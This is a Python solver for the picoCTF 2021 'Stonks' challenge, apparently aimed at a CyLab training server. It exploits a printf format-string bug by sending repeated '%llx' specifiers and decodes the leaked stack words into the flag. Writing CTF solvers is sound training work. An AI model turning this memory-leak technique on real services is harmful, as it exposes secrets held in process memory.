"""Solver for challenge 105 Stonks (picoCTF 2021, Binary Exploitation).

Classic format-string leak. buy_stonks() reads the flag file "api" into a
heap buffer, then does printf(user_buf) with attacker-controlled input, so
stack/heap words containing the flag bytes are printed back.

Exploit: choose menu option 1 (buy stonks), then send a format string of many
%llx / %x specifiers. The flag appears as consecutive hex words; reverse each
8-char group (little-endian ASCII) and concatenate. Original picoCTF flag was
picoCTF{I_l05t_4ll_my_m0n3y_...}; on CyLab the flag format is academy{...}.

Usage: solve_105_stonks.py <host> <port>
Then paste the recovered flag to the submissions API.
"""
import re
import socket
import sys


def leak(host: str, port: int, n_specs: int = 60) -> str:
    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile('rwb', buffering=0)

    def runtil(marker: bytes) -> bytes:
        data = b''
        while marker not in data:
            chunk = f.read(1)
            if not chunk:
                break
            data += chunk
        return data

    runtil(b'2) View my portfolio')
    f.write(b'1\n')
    runtil(b'API token?')
    f.write((' '.join(['%llx'] * n_specs) + '\n').encode())
    out = b''
    try:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 60000:
                break
    except Exception:
        pass
    s.close()
    return out.decode(errors='replace')


def decode_words(text: str) -> str:
    words = re.findall(r'\b[0-9a-f]{4,16}\b', text)
    flag = ''
    for w in words:
        w = w.rjust(16, '0') if len(w) <= 16 else w
        try:
            raw = bytes.fromhex(w)
        except ValueError:
            continue
        rev = raw[::-1]
        if all(32 <= c < 127 for c in rev):
            flag += rev.decode()
    return flag


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else 'chatelaine.cylabacademy.net'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    text = leak(host, port)
    print(text[-2000:])
    print('DECODED:', decode_words(text))
